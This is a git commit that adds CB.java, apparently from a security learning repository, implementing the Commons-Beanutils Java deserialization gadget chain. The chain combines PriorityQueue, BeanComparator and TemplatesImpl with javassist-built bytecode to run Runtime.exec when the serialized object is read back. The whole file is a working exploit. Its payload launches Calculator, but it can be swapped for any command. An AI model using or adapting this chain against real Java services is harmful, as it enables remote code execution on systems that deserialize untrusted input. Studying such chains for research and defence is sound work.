8ac624bed7cd478b1bfa051aeea68cb67c3f3a65
Lxxx <62978419+LxxxSec@users.noreply.github.com>
2024-01-30 15:30:31 +0800

    Create CB.java

---
+++ CB.java
@@ -0,0 +1,59 @@
+package com.xiinnn.unser;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.beanutils.BeanComparator;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class CB {
+    public static String filePath = "./ser.bin";
+    public static void main(String[] args) throws Exception{
+        byte[][] codes = {getTemplates()};
+        //CC3
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, "_name", "useless");
+        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+        setFieldValue(templates, "_bytecodes", codes);
+
+        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+
+        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(beanComparator);
+        priorityQueue.add("1");
+        priorityQueue.add("2");
+
+        //将priorityQueue的queue改为templates
+        setFieldValue(priorityQueue, "queue", new Object[]{templates, templates});
+        //将BeanComparator的property改为outputProperties
+        setFieldValue(beanComparator, "property", "outputProperties");
+        //序列化
+        ser(priorityQueue);
+        //反序列化
+        unser();
+    }
+    public static void ser(Object obj) throws IOException {
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(filePath));
+        objectOutputStream.writeObject(obj);
+    }
+    public static Object unser() throws IOException, ClassNotFoundException {
+        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filePath));
+        return objectInputStream.readObject();
+    }
+    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
+        Field dField = obj.getClass().getDeclaredField(field);
+        dField.setAccessible(true);
+        dField.set(obj, val);
+    }
+    public static byte[] getTemplates() throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass template = pool.makeClass("MyTemplate");
+        template.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
+        String block = "Runtime.getRuntime().exec(\"open -a Calculator\");";
+        template.makeClassInitializer().insertBefore(block);
+        return template.toBytecode();
+    }
+}
